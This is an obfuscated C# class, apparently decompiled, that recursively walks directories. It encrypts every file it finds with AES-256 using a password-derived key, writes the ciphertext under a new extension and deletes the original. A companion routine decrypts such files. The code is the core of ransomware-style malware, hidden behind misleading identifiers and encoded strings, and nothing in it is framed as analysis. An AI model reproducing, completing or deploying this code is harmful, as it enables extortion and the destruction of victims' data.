using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class head
{
	public static int SerializationException;

	private static ToOACurrency TKIND_ALIAS;

	private static string get_IsRightToLeft;

	public static string PostconditionOnException;

	public static string Generic;

	public static List<string> CallConvThiscall;

	private static int ConvertToVector256Int32/* Not supported: data(00 00 00 00) */;

	private static int EnsuresOnThrow/* Not supported: data(01 00 00 00) */;

	private static int ReservedMask/* Not supported: data(03 00 00 00) */;

	private static int DefaultCategory/* Not supported: data(02 00 00 00) */;

	private static int get_LocalType/* Not supported: data(B6 13 00 00) */;

	private static int AddChannel/* Not supported: data(C3 69 F4 FF) */;

	private static int get_BuilderType/* Not supported: data(A4 C4 FE FF) */;

	private static int EventParameterInfo/* Not supported: data(04 A8 09 00) */;

	private static int lptcomp/* Not supported: data(45 FF FB FF) */;

	private static int get_EndOfStream/* Not supported: data(42 22 A8 2F) */;

	private static int ComInterfaceDispatch/* Not supported: data(A0 07 00 00) */;

	private static int HostPolicy/* Not supported: data(A0 7D F7 FF) */;

	public unsafe static void Ephemeral(string string_0)
	{
		int[] array = new int[1] { 1 };
		try
		{
			string[] files = Directory.GetFiles(string_0);
			for (int i = _003CModule_003E.Deny[0]; i < files.Length; i += sizeof(byte))
			{
				string text = files[i];
				if ((text.Contains(get_IsRightToLeft) ? 1 : 0) == ((-54647 < Convert.ToInt32("fff94832", 16)) ? (-52139) : Convert.ToInt32("0", 16)))
				{
					ToOACurrency tKIND_ALIAS = TKIND_ALIAS;
					string string_ = string.Concat(char.ToString('磙'), char.ToString('磲'), char.ToString('磿') + "磮磥" + "磬磨磵磲磻碦碼");
					object[] array2 = new object[0 | (nint)((Array)(object)"\u036d\u0326\u0332").LongLength];
					array2[Convert.ToInt32("0", 8)] = (char)(_003CModule_003E.Deny[14] + Convert.ToInt32("10010010010010011111", 2));
					array2[EnsuresOnThrow] = Marshal.SizeOf(typeof(As));
					array2[2] = Convert.ToInt32("11111111111111111110110100000010", 2) * _003CModule_003E.Task_RunSynchronously_Continuation[7];
					_003CModule_003E.TryFormatDecimal(ref string_, array2);
					tKIND_ALIAS.Keys(string_ + text);
					CallConvThiscall.Add(text);
					smethod_0(text, PostconditionOnException);
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			for (int j = Convert.ToInt32("253655", 8) ^ Convert.ToInt32("10101011110101101", 2); j < directories.Length; j += array[0])
			{
				string string_2 = directories[j];
				Ephemeral(string_2);
			}
		}
		catch (Exception ex)
		{
			TKIND_ALIAS.TicksPerMinute(ex.Message);
		}
	}

	public static void Union(string string_0)
	{
		char[] array = new char[1] { '\u0094' };
		int[] array2 = new int[1] { 1549 };
		try
		{
			string[] files = Directory.GetFiles(string_0);
			for (int i = 0 * Convert.ToInt32("11f24", 16); i < files.Length; i += Marshal.SizeOf(typeof(StackCrawlMarkHandle)) & 1)
			{
				string text = files[i];
				if (EventLogClassic(text))
				{
					ToOACurrency tKIND_ALIAS = TKIND_ALIAS;
					string string_ = string.Concat(char.ToString('Ψ') + "ΉΏ", "ΞΕ" + "ΜΘ\u0385\u0382\u038bϖό");
					object[] array3 = new object[4];
					char c = array[0];
					array3[0] = (int)c;
					array3[~_003CModule_003E.IsRunning[10]] = 59;
					array3[Convert.ToInt32("2", 16)] = 398;
					array3[array2[0] >> 9] = 399;
					_003CModule_003E.TryFormatDecimal(ref string_, array3);
					tKIND_ALIAS.Keys(string_ + text);
					Delta(text, text.Substring(0, text.Length - get_IsRightToLeft.Length), Generic);
				}
			}
			string[] directories = Directory.GetDirectories(string_0);
			for (int j = 0; j < directories.Length; j += checked(387755 - Marshal.SizeOf(typeof(EPROTOTYPE))))
			{
				string string_2 = directories[j];
				Union(string_2);
			}
		}
		catch (Exception ex)
		{
			TKIND_ALIAS.TicksPerMinute(ex.Message);
		}
	}

	private static bool EventLogClassic(string string_0)
	{
		if (string_0.Contains(get_IsRightToLeft) && string_0.Substring(string_0.Length - get_IsRightToLeft.Length, get_IsRightToLeft.Length) == get_IsRightToLeft)
		{
			return true;
		}
		return (byte)ConvertToVector256Int32 != 0;
	}

	private static void smethod_0(string string_0, string string_1)
	{
		char[] array = new char[2] { '뜯', '\u0080' };
		int[] array2 = new int[3] { 8, 244, 0 };
		byte[] array3 = new byte[32];
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i += Marshal.SizeOf(typeof(Tuple__2)) >> 6)
		{
			rNGCryptoServiceProvider.GetBytes(array3);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(string_0 + get_IsRightToLeft, (FileMode)DefaultCategory);
		byte[] bytes = Encoding.UTF8.GetBytes(string_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		int num2 = (rijndaelManaged.BlockSize = ((Convert.ToInt32("1110001100011111", 2) == 28525) ? (-242785) : array[1]));
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array3, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / array2[array2[2]]);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		int num3 = (int)(rijndaelManaged.Mode = ((-20233 > _003CModule_003E.IsRunning[11]) ? CipherMode.CBC : ((CipherMode)get_BuilderType)));
		fileStream.Write(array3, 0, array3.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), (CryptoStreamMode)Convert.ToInt32("1", 2));
		FileStream fileStream2 = new FileStream(string_0, (FileMode)Convert.ToInt32("3", Convert.ToInt32("8", 16)));
		byte[] array4 = new byte[1048576];
		try
		{
			int count;
			while ((count = fileStream2.Read(array4, _003CModule_003E.Deny[15] - -512467, array4.Length)) > _003CModule_003E.Deny[0])
			{
				cryptoStream.Write(array4, Convert.ToInt32("0", 2), count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			TKIND_ALIAS.TicksPerMinute(ex.Message);
		}
		finally
		{
			ToOACurrency tKIND_ALIAS = TKIND_ALIAS;
			string string_2 = string.Concat(char.ToString('৫'), char.ToString('\u09c0'), char.ToString('\u09cd') + char.ToString('\u09d7') + "\u09de\u09da\u09cb\u09ca\u098e");
			object[] array5 = new object[~Convert.ToInt32("37777777771", 8)];
			array5[0] = checked(316 * EnsuresOnThrow);
			array5[-632835 + EventParameterInfo] = false;
			array5[Convert.ToInt32("2", Convert.ToInt32("10000", 2))] = Marshal.SizeOf(typeof(In));
			array5[3] = string.Concat("Ȧ\u0017", char.ToString('\u0002') + "\0\0\u0002");
			array5[262335 + lptcomp] = (char)array2[1];
			array5[Convert.ToInt32("3450514046", 8) / 96083566] = string.Concat(char.ToString('\r'), char.ToString('\u0001') + "\u001b\u0015");
			_003CModule_003E.TryFormatDecimal(ref string_2, array5);
			tKIND_ALIAS.Rune(string_2 + string_0);
			int serializationException = SerializationException;
			int num4 = ((Array)(object)"\u0368").Length;
			SerializationException = serializationException + num4;
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(string_0);
		}
	}

	private unsafe static void Delta(string string_0, string string_1, string string_2)
	{
		char[] array = new char[5] { '\0', '\u0080', '㉺', '阏', 'ᄤ' };
		int[] array2 = new int[5] { 0, 3, 947538, 5946, 8043 };
		byte[] bytes = Encoding.UTF8.GetBytes(string_2);
		byte[] array3 = new byte[32];
		FileStream fileStream = new FileStream(string_0, FileMode.Open);
		fileStream.Read(array3, array[Convert.ToInt32("0", 8)], array3.Length);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = array[Convert.ToInt32("1", 8)];
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array3, 50000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int)(rijndaelManaged.KeySize / (nint)((Array)(object)(char.ToString('\u0314') + char.ToString('\u0365') + "\u0352\u031e.\u036d\u032b\u0308")).LongLength));
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / checked(69378 - Convert.ToInt32("10efa", 16)));
		rijndaelManaged.Padding = (PaddingMode)DefaultCategory;
		rijndaelManaged.Mode = CipherMode.CBC;
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), (CryptoStreamMode)(0 % _003CModule_003E.IsRunning[12]));
		FileStream fileStream2 = new FileStream(string_1, (FileMode)(_003CModule_003E.Task_RunSynchronously_Continuation[0] << 1));
		checked
		{
			byte[] array4 = new byte[_003CModule_003E.Task_RunSynchronously_Continuation[9] - array2[2]];
			try
			{
				int count;
				while ((count = cryptoStream.Read(array4, array2[0], array4.Length)) > 0)
				{
					fileStream2.Write(array4, ConvertToVector256Int32, count);
				}
			}
			catch (CryptographicException ex)
			{
				ToOACurrency tKIND_ALIAS = TKIND_ALIAS;
				string string_3 = string.Concat("\uf028\uf019" + "\uf012\uf01b\uf01f\uf004\uf00c\uf019\uf00a\uf01b", "\uf003\uf002\uf008\uf02e\uf013\uf008\uf00e\uf01b\uf01f" + "\uf002\uf004\uf005\uf04b\uf00e\uf019\uf019\uf004\uf019\uf051\uf04b");
				object[] array5 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
				array5[Convert.ToInt32("11111111111111100101011000101110", 2) + 109010] = _003CModule_003E.Task_RunSynchronously_Continuation[1];
				array5[1] = unchecked(get_EndOfStream / 750045);
				int num = Marshal.SizeOf(typeof(Leave_S));
				array5[2] = num;
				array5[array2[1]] = Convert.ToInt32("11001101", 2) * Convert.ToInt32("1d", 16);
				array5[Convert.ToInt32("4", sizeof(decimal))] = string.Concat(char.ToString('ᄔ'), char.ToString('Ⴔ') + "葸℘");
				_003CModule_003E.TryFormatDecimal(ref string_3, array5);
				tKIND_ALIAS.TicksPerMinute(string_3 + ex.Message);
			}
			catch (Exception ex2)
			{
				TKIND_ALIAS.TicksPerMinute(ex2.Message);
			}
		}
		try
		{
			cryptoStream.Close();
			ToOACurrency tKIND_ALIAS2 = TKIND_ALIAS;
			string string_4 = string.Concat("朳朒", "朔朅", char.ToString('朎') + char.ToString('朇') + "會朒朓杍杗");
			object[] array6 = new object[3];
			int num2 = array[4];
			array6[0] = (char)num2;
			array6[checked(1 * EnsuresOnThrow)] = string.Concat(char.ToString((char)array2[3]), char.ToString('\u0097') + char.ToString('ױ') + "Ūҭ");
			array6[(nint)((Array)(object)"\u033d\u031f").LongLength] = array[2];
			_003CModule_003E.TryFormatDecimal(ref string_4, array6);
			tKIND_ALIAS2.Rune(string_4 + string_0);
		}
		catch (Exception ex3)
		{
			ToOACurrency tKIND_ALIAS3 = TKIND_ALIAS;
			string string_5 = string.Concat(char.ToString('\uebfd') + char.ToString('\uebca') + "\uebca\uebd7\uebca\ueb98\uebda\uebc1", "\ueb98\uebdb" + "\uebd4\uebd7" + "\uebcb\uebd1\uebd6\uebdf\ueb98", char.ToString('\uebfb') + "\uebca\uebc1\uebc8\uebcc\uebd7\uebeb\uebcc\uebca\uebdd\uebd9\uebd5\ueb82\ueb98");
			object[] array7 = new object[2];
			array7[checked(0 * Convert.ToInt32("77a72", 16))] = char.ToString((char)array2[4]) + char.ToString('ⵘ') + "\u07fbë";
			array7[1] = (int)array[3];
			_003CModule_003E.TryFormatDecimal(ref string_5, array7);
			tKIND_ALIAS3.TicksPerMinute(string_5 + ex3.Message);
		}
		finally
		{
			fileStream2.Close();
			fileStream.Close();
		}
	}

	static head()
	{
		int[] array = new int[2] { 0, 2 };
		SerializationException = Convert.ToInt32("0", 16) * -978867;
		string string_ = string.Concat(char.ToString('樂'), char.ToString((char)Convert.ToInt32("1111100110111110", 2)), char.ToString('惡') + "瑩寮");
		object[] array2 = new object[5];
		array2[0] = 55138;
		array2[1] = (char)get_LocalType;
		array2[2] = (byte)Convert.ToInt32("0", 8) != 0;
		array2[ReservedMask] = char.ToString('ѩ') + "Ǘă";
		int comInterfaceDispatch = ComInterfaceDispatch;
		array2[4] = (char)comInterfaceDispatch;
		_003CModule_003E.TryFormatDecimal(ref string_, array2);
		TKIND_ALIAS = new ToOACurrency(string_, checked(HostPolicy + Convert.ToInt32("10001000001001100000", 2)));
		string string_2 = string.Concat(char.ToString((char)Convert.ToInt32("1110100110001000", 2)), "\ue9c1\ue9cf\ue9d0\ue9c3" + "\ue9cb\ue9c3\ue9c8\ue9cf\ue9d2\ue9d4\ue9c9");
		object[] array3 = new object[Marshal.SizeOf(typeof(get_EncodedArgument)) % 12];
		int num = ((-77882 < Convert.ToInt32("11111111111101100000000111101101", 2)) ? Convert.ToInt32("99d3d", 16) : 0);
		array3[num] = 789 * Convert.ToInt32("31", 8);
		array3[1] = (byte)array[0] != 0;
		int num2 = array[1];
		array3[num2] = 3772;
		array3[3] = 5200;
		int num3 = ((-6336 < Marshal.SizeOf(typeof(Emit))) ? 4 : 951948);
		array3[num3] = 21458;
		array3[5] = '▻';
		_003CModule_003E.TryFormatDecimal(ref string_2, array3);
		get_IsRightToLeft = string_2;
		PostconditionOnException = get_IsMetric.Platform;
		CallConvThiscall = new List<string>();
	}
}
